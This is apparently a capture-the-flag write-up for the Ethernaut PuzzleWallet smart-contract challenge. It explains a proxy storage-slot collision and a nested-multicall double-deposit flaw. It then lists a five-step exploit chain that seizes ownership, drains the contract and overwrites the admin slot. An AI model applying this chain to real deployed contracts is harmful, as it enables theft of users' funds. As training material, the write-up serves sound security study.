# Ethernaut Level 24: PuzzleWallet

## Objective
Become the admin of the proxy.

## Dual Vulnerabilities

### 1. Storage Collision (Proxy Pattern)
Proxy and Implementation have different storage layouts:

```solidity
// Proxy.sol - storage slot 0
address public pendingAdmin;

// PuzzleWallet.sol - storage slot 0  
address public owner;  // ← COLLISION!
address public admin;  // storage slot 1
```

Calling `proposeNewAdmin()` on proxy writes slot 0, overwriting `owner` in logic!

### 2. Multicall Reentrancy
```solidity
function multicall(bytes[] calldata data) external payable {
    for (uint256 i = 0; i < data.length; i++) {
        (bool success, ) = address(this).delegatecall(data[i]);
        // Each delegatecall can send value - no reentrancy check!
    }
}
```

Nested multicall allows single deposit to credit multiple times.

## Exploit Chain

```
1. proposeNewAdmin(attacker) 
   → writes proxy.slot0 = attacker
   → logic sees owner = attacker
   
2. addToWhitelist(attacker)
   → passes onlyOwner check
   
3. multicall([deposit(), multicall([deposit()])])
   → deposit called twice
   → only 0.001 ETH sent
   → balance[attacker] = 0.002 credited
   
4. execute(attacker, contract.balance)
   → withdraw all funds
   
5. setMaxBalance(uint256(attacker))
   → admin slot (slot 1) = attacker address
```

## Status: ✅ COMPLETE
**Exploit validated:** 2026-02-01T10:41Z
